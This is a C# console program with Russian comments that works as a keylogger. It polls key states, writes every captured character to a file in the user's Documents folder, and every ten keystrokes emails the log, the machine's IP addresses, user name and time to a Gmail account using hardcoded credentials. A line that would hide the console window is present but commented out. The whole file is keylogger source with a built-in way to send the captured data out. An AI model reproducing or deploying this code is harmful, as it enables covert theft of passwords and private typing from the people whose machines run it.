using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace tipKL
{
    class Program
    {
        const int SW_HIDE = 0;//Константа для скрытия консоли

        



        [DllImport("User32.dll")]// КЛ
        public static extern int GetAsyncKeyState(Int32 i);
        static long numberOfKeystrokes = 0; //для отправлении на почту + удержание клавиш

        [DllImport("kernel32.dll")] //консоль
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")] //консоль
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [STAThread]

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();





         //   ShowWindow(handle, SW_HIDE); //Та самая функция, которая прячет консоль





            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if(!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }
            string path = (filepath + @"\FileOfLoggedKeys.txt");

            if(!File.Exists(path))
            {
                using(StreamWriter sw = File.CreateText(path))
                {
                        //Пусть живёт
                }
            }

            while (true)
            {
                Thread.Sleep(100); //Мой ЦП слишком быстрый, и выводит на 20 символов более. Самая оптимальная задержка - 100МС

                for (int i = 32; i < 127; ++i)//Чекает все клавиши. Значения взяты из таблицы ASCII
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState != 0) //Если этого условия не будет - в консоль будет выводиться только 0 бесконечно раз
                    {
                        Console.WriteLine((char)i + ", ");
                        using(StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i);
                        }
                        ++numberOfKeystrokes;
                        //отправляет спустя каждые 10 символов
                        if (numberOfKeystrokes % 10 ==0)
                        {
                            SendNewMessage();
                        }
                    }

                }

            }
        }// main

        static void SendNewMessage()
        {
            String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = folderName + @"\FileOfLoggedKeys.txt";
            String logContents = File.ReadAllText(filePath);
            string emailBody = ""; //Ниже будем заполнять
            DateTime now = DateTime.Now;
            string subject = "Message from KL";
            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var address in host.AddressList)
            {
                emailBody += "Address: " + address;
            }
            emailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
            emailBody += "\nhost " + host;
            emailBody += "\ntime: " + now.ToString();
            emailBody += logContents;

            SmtpClient client = new SmtpClient("sheavyway@gmail.com", 995); //Куда отправить + порт данного мыла
               //Работает на всех email'ах. Так что если будет исключение - можно подставить мыло и порт к нему на свой выбор :Р
            MailMessage mailMessage = new MailMessage();
            mailMessage.From = new MailAddress("colonelshsh@gmail.com");//откудо пришло письмо
            mailMessage.To.Add("colonelshsh@gmail.com");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("colonelshsh@gmail.com", "colonel405");//фейк мыло + пароль
            mailMessage.Body = emailBody;

            client.Send(mailMessage);

        }
    }
}
